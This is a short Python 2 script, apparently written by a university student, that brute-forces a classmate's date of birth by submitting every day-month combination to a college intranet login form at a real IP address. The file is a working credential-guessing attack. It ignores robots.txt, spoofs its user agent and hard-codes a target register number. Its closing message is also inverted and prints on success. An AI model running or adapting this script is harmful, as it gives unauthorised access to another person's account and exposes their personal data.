#Python Version 2.7 
#APPLICATION: Info Finder for SJCTNI
#CODER: Manikandanraj B K
#B.Tech, CSE.
#SASTRA University.
#Last Update: 14/06/2017
import mechanize 

days=['01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31']
months=['01','02','03','04','05','06','07','08','09','10','11','12']
#ENTER REGISTER NUMBER IN SINGLE QUOTES
id='15uel523'
#ENTER EXPECTED YEAR IN SINGLE QUOTES
y='1997'
br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.addheaders = [ ( 'User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1' ) ]
for d in days:
	for m in months:
		br.open("http://210.212.250.37/intranet/loginpage_stud.jsp")
		br.select_form(name="Login")
		br.form['userId'] = id
		br.form['yyyy'] = y
		br.form['dd']=d
		br.form['mm']=m
		print "Trying date:"+str(d)+"-"+str(m)+"-"+str(y)
		response=br.submit()
		if (response.geturl()=="http://210.212.250.37/intranet/login_frame_stud_.jsp"):
			print "D.O.B for user "+str(id)+" is: "+str(d)+"-"+str(m)+"-"+str(y)
			break
	if (response.geturl()=="http://210.212.250.37/intranet/login_frame_stud_.jsp"):
		break
if (response.geturl()=="http://210.212.250.37/intranet/login_frame_stud_.jsp"):
	print "Wrong Register Number or Wrong year, try a different year"